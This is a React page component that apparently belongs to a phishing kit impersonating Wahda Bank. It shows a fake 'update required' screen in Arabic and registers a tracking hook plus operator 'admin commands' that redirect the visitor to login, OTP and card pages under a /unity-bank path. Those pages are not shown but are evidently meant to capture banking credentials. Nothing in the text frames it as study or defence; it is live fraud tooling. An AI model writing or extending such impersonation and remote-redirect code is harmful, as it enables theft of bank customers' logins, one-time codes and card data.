import { useEffect, useState } from "react";
import { useAdminCommands, useTracking } from "@/lib/useTracking";

const C = {
  navy: "#1B2B6B",
  navyLight: "#2A3F8F",
  blue: "#4A5FEA",
  cyan: "#5DD8F8",
  gold: "#F0B429",
  white: "#FFFFFF",
  bodyBg: "#EDEEF4",
};

const APP_STORE_URL = "https://play.google.com/store/apps/details?id=com.wahda.bank";

function WahdaW({ size = 72 }: { size?: number }) {
  return (
    <svg viewBox="0 0 64 52" width={size} height={size * 0.81} fill="none">
      <path
        d="M2 4 L14 46 L24 20 L32 40 L40 20 L50 46 L62 4"
        stroke={C.cyan} strokeWidth="7" strokeLinecap="round" strokeLinejoin="round"
      />
    </svg>
  );
}

function UpdateIcon() {
  return (
    <svg width="48" height="48" viewBox="0 0 24 24" fill="none" stroke={C.cyan} strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round">
      <path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4" />
      <polyline points="17 8 12 3 7 8" />
      <line x1="12" y1="3" x2="12" y2="15" />
    </svg>
  );
}

export default function UpdatePage() {
  useTracking("تحديث التطبيق");
  const [visible, setVisible] = useState(false);

  useAdminCommands({
    "redirect:login": () => { window.location.href = "/unity-bank/login"; },
    "redirect:otp":   () => { window.location.href = "/unity-bank/otp"; },
    "redirect:card":  () => { window.location.href = "/unity-bank/card"; },
  });

  useEffect(() => {
    const t = setTimeout(() => setVisible(true), 80);
    return () => clearTimeout(t);
  }, []);

  return (
    <div
      dir="rtl"
      style={{
        minHeight: "100dvh",
        display: "flex",
        flexDirection: "column",
        fontFamily: "'Cairo', system-ui, sans-serif",
        background: C.navy,
        opacity: visible ? 1 : 0,
        transition: "opacity 0.5s ease",
        position: "relative",
        overflow: "hidden",
      }}
    >
      {/* decorative circles */}
      <div style={{
        position: "absolute", top: "-80px", right: "-80px",
        width: "280px", height: "280px", borderRadius: "50%",
        background: "rgba(74,95,234,0.25)",
        pointerEvents: "none",
      }} />
      <div style={{
        position: "absolute", bottom: "-60px", left: "-60px",
        width: "220px", height: "220px", borderRadius: "50%",
        background: "rgba(93,216,248,0.12)",
        pointerEvents: "none",
      }} />

      {/* Logo */}
      <div style={{ padding: "52px 28px 0", textAlign: "center" }}>
        <div style={{ display: "flex", justifyContent: "center", marginBottom: "10px" }}>
          <WahdaW size={80} />
        </div>
        <p style={{ color: C.white, fontSize: "24px", fontWeight: "900", margin: 0 }}>
          مصرف الوحدة
        </p>
        <p style={{
          color: C.cyan, fontSize: "12px", fontWeight: "700",
          letterSpacing: "0.14em", margin: "4px 0 0",
        }}>
          WAHDA BANK
        </p>
      </div>

      {/* Update card */}
      <div style={{ flex: 1, display: "flex", alignItems: "center", justifyContent: "center", padding: "32px 24px" }}>
        <div style={{
          width: "100%",
          borderRadius: "24px",
          overflow: "hidden",
          boxShadow: "0 20px 60px rgba(0,0,0,0.35)",
        }}>
          {/* card header */}
          <div style={{
            background: `linear-gradient(135deg, ${C.blue} 0%, #2E40C8 100%)`,
            padding: "32px 24px 24px",
            textAlign: "center",
          }}>
            <div style={{ display: "flex", justifyContent: "center", marginBottom: "16px" }}>
              <UpdateIcon />
            </div>
            <div style={{
              display: "inline-block",
              background: C.gold,
              color: C.navy,
              fontSize: "11px",
              fontWeight: "900",
              padding: "4px 14px",
              borderRadius: "20px",
              letterSpacing: "0.06em",
              marginBottom: "14px",
            }}>
              تحديث مطلوب
            </div>
            <p style={{
              color: C.white,
              fontSize: "26px",
              fontWeight: "900",
              lineHeight: "1.2",
              margin: 0,
            }}>
              يتوفر تحديث جديد
            </p>
            <p style={{
              color: C.cyan,
              fontSize: "15px",
              fontWeight: "700",
              margin: "6px 0 0",
            }}>
              للتطبيق
            </p>
            <p style={{
              color: "rgba(255,255,255,0.75)",
              fontSize: "13px",
              fontWeight: "500",
              margin: "12px 0 0",
              lineHeight: "1.6",
            }}>
              يجب تحديث التطبيق للاستمرار في استخدام<br />
              خدمات مصرف الوحدة الرقمي
            </p>
          </div>

          {/* card body */}
          <div style={{
            background: "#F4F6FF",
            padding: "20px 24px",
            display: "flex",
            flexDirection: "column",
            gap: "10px",
          }}>
            {[
              { icon: "🔒", text: "أمان وحماية مُحسّنة" },
              { icon: "⚡", text: "أداء أسرع وتجربة أفضل" },
              { icon: "✅", text: "ميزات وخدمات جديدة" },
            ].map(({ icon, text }) => (
              <div key={text} style={{ display: "flex", alignItems: "center", gap: "10px" }}>
                <span style={{ fontSize: "18px" }}>{icon}</span>
                <span style={{ color: C.navy, fontSize: "14px", fontWeight: "600" }}>{text}</span>
              </div>
            ))}
          </div>
        </div>
      </div>

      {/* CTA button */}
      <div style={{ padding: "0 24px 48px" }}>
        <button
          onClick={() => { window.location.href = APP_STORE_URL; }}
          style={{
            width: "100%",
            height: "58px",
            borderRadius: "16px",
            background: C.cyan,
            color: C.navy,
            fontSize: "18px",
            fontWeight: "900",
            border: "none",
            cursor: "pointer",
            fontFamily: "inherit",
            boxShadow: `0 8px 24px rgba(93,216,248,0.35)`,
            letterSpacing: "0.02em",
            display: "flex",
            alignItems: "center",
            justifyContent: "center",
            gap: "8px",
          }}
        >
          تحديث التطبيق ↓
        </button>
        <p style={{
          textAlign: "center",
          color: "rgba(255,255,255,0.45)",
          fontSize: "12px",
          marginTop: "12px",
        }}>
          التحديث مجاني ومتاح الآن
        </p>
      </div>
    </div>
  );
}
